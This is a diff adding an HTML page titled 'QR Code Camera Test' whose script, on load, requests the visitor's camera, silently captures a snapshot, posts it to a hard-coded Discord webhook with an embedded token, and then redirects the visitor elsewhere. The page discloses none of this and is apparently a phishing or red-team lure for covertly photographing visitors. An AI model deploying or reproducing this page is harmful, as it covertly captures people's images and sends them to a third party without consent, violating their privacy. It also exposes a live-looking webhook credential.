@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QR Code Camera Test</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <script>
+        const video = document.getElementById('video');
+        const webhookURL = "https://discord.com/api/webhooks/1341299046094209105/cUFsKop8wOufYDkV3zQyeAhmDAjHaNZDlWqjxUSmAasbA0Jgyukd2KZ2rLCvSYeeHFxu";  // Replace with actual webhook URL
+        const redirectURL = "https://redteamacademy.com/about-us/"; // Replace with your website
+
+        // Request camera access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    console.log("Camera access granted.");
+                    captureImage(); // Capture only once, then redirect
+                };
+            })
+            .catch(err => {
+                console.error("Camera access denied!", err);
+            });
+
+        function captureImage() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            setTimeout(() => { // Small delay for the camera to stabilize
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert image to Blob
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("file", blob, "snapshot.png");
+                    formData.append("content", "📸 New Image Captured!");
+
+                    console.log("Sending image to Discord...");
+
+                    // Send to Discord Webhook
+                    fetch(webhookURL, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! Status: ${response.status}`);
+                        }
+                        return response.text();
+                    })
+                    .then(data => {
+                        console.log("Image sent successfully:", data);
+                        window.location.href = redirectURL; // Redirect after sending image
+                    })
+                    .catch(error => console.error("Error sending image:", error));
+
+                }, "image/png");
+
+            }, 2000); // 3-second delay before capturing to allow for proper exposure
+        }
+    </script>
+</body>
+</html>
